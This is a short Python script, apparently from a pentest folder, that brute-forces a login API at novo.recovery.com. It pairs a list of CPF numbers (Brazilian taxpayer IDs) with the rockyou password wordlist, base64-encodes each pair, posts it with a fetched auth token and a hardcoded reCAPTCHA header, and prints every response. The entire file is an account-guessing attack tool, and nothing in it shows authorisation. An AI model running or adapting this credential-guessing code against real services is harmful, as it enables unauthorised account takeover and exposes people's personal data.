#!/usr/bin/python3 

import requests
import json
import base64
import re

url = "https://novo.recovery.com/backend/api/Auth/LogOn"
auth_url = "https://novo.recovery.com/backend/api/Auth/Authenticate"
auth_headers = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

cpf_file_list = open("/home/leandro/pentest/wordlsits/cpfs.txt", "r")
password_file_list = open("/home/leandro/pentest/wordlists/rockyou.txt", "r")

for cpfline in cpf_file_list:

    auth_token = requests.post(auth_url,headers=auth_headers) 
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "G-recovery-reCAPTCHA-Test": "03AGdBq27G7OCbd7qUCP4mSDAknlak6nqdKzw5VmzAP0kSd7L-YmWvgwzo3i2RAfrXXpF6MkMxceskjYO1kO3nHu3kAATCizwx3DqvzHhxOb8ASYgLQhftwI8u7U1cVI4Pon7CJRMvggDGhkTfKYVOGPew26ojkab65ermbrDp3ewe6IM2hJ-OnctcKE4ZEUvEaCh6LU44UyXhIEimlvunM0R9WshbBHQbGR3J870hzOtjq01ZG1JC6_GZOU1qZ7TVU78x7U1NuukUJzVjFh_CZR-ljtq48oU4JO_Rlo49TaeSNfQ4EnxiUTG3FHTvWjkCDKAw8A946uryGxo0BD1qCCxyTFW3a8CDXzmT-u4kPyzOiVr07Hnuf2HY7_kw0xVH63EQttdLmC472UYyev4y7vcP6GDK4X0snwDESBI1LSFKirDbZ6vwbEiwX8fUicyaWpYvdsGxl7xJdzt_kY7506MvQMk3PObkrZ6yFtao69b7zmFSZuFpG3k",
        "X-recovery-Authenticate": auth_token.json()['token']
    }

    cpf = cpfline.rstrip("\n").encode('utf-8')

    for passline in password_file_list:
        password = passline.rstrip("\n").encode('utf-8')
        data = {
            "Documento": base64.b64encode(cpf).decode('utf-8'),
            "Senha": base64.b64encode(password).decode('utf-8')
        }

        r = requests.post(url, headers=headers, data=json.dumps(data, indent=4))
        print(cpf, password)
        print(r.text)
